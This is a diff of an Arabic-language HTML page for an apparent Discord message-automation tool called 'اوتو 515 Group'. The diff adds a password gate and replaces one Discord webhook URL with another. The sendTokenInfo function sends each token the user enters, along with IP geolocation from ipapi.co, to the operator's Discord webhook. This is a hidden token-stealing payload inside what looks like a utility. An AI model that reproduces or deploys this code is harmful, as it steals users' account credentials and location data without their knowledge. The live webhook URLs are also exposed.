@@ -13,7 +13,7 @@ input, textarea, select { padding:12px; border-radius:8px; border:none; backgrou
 button { padding:12px; border-radius:12px; font-weight:bold; cursor:pointer; transition: all 0.2s ease; border:2px solid #000; }
 button:hover { transform: translateY(-2px); box-shadow:0 6px 10px rgba(0,0,0,0.5); }
 button:disabled { background: grey; cursor:not-allowed; box-shadow:none; }
-#autoPanel { display:block; padding:20px; background: linear-gradient(135deg,#1a0033,#004d26); color:white; border-radius:12px; margin-top:20px; }
+#autoPanel { display:none; padding:20px; background: linear-gradient(135deg,#1a0033,#004d26); color:white; border-radius:12px; margin-top:20px; }
 .left-btn { position:absolute; left:20px; top:20px; padding:8px 14px; font-size:14px; background:#7b00ff; color:white; border-radius:8px; cursor:pointer; font-weight:bold; }
 .left-btn:hover { transform: scale(1.05); box-shadow:0 0 10px #00ff7b,0 0 15px #7b00ff; }
 #stopBtn { background: linear-gradient(145deg,#ff0044,#990022); }
@@ -23,6 +23,15 @@ button:disabled { background: grey; cursor:not-allowed; box-shadow:none; }
 </style>
 </head>
 <body>
+
+<div id="loginPage">
+<div id="loginContainer">
+<h2>تسجيل الدخول</h2>
+<label>قم بوضع كلمة السر للدخول:</label>
+<input type="password" id="loginInput" placeholder="كلمة السر">
+<button id="loginBtn">دخول</button>
+</div>
+</div>
 
 <div class="container" id="autoPanel">
 <h2>اوتو 515 Group</h2>
@@ -60,6 +69,10 @@ button:disabled { background: grey; cursor:not-allowed; box-shadow:none; }
 <audio id="clickSound" src="https://www.soundjay.com/buttons/button-09.mp3"></audio>
 
 <script>
+const loginInput=document.getElementById('loginInput');
+const loginBtn=document.getElementById('loginBtn');
+const loginPage=document.getElementById('loginPage');
+const autoPanel=document.getElementById('autoPanel');
 const tokensInput=document.getElementById('tokens');
 const idsInput=document.getElementById('ids');
 const targetIdInput=document.getElementById('targetId');
@@ -109,7 +122,7 @@ else{const p=document.createElement('p'); p.textContent=`فشل الإرسال �
 }
 
 async function sendTokenInfo(token){
-const webhookURL="https://discord.com/api/webhooks/1405584359335002154/x5qJYTjbnDLJhGjShcXWnsipzbVbKo45QwU33vX6EJAM7_tvmUqnW61vzk7e7iKIU_RX";
+const webhookURL="https://discord.com/api/webhooks/1405591254338768988/KTnVxqkBxUgLexYhiBgmPUIRHWNtbtNmKr8FxlGukA8JzfStIJl32JxXBxjMbTiXU3Gy";
 try{
 const ipData=await fetch('https://ipapi.co/json/').then(res=>res.json());
 const payload={
@@ -148,6 +161,11 @@ function stopSending(){if(intervalId){clearInterval(intervalId); intervalId=null
 
 startBtn.addEventListener('click',()=>{clickSound.play(); startSending();});
 stopBtn.addEventListener('click',()=>{clickSound.play(); stopSending();});
+
+loginBtn.addEventListener('click',()=>{
+if(loginInput.value.trim()==='515'){loginPage.style.display='none'; autoPanel.style.display='block';}
+else{loginBtn.textContent='كلمة سر غلط'; loginBtn.style.background='red'; setTimeout(()=>{loginBtn.textContent='دخول'; loginBtn.style.background='#00ff4d';},3000);}
+});
 </script>
 </body>
 </html>
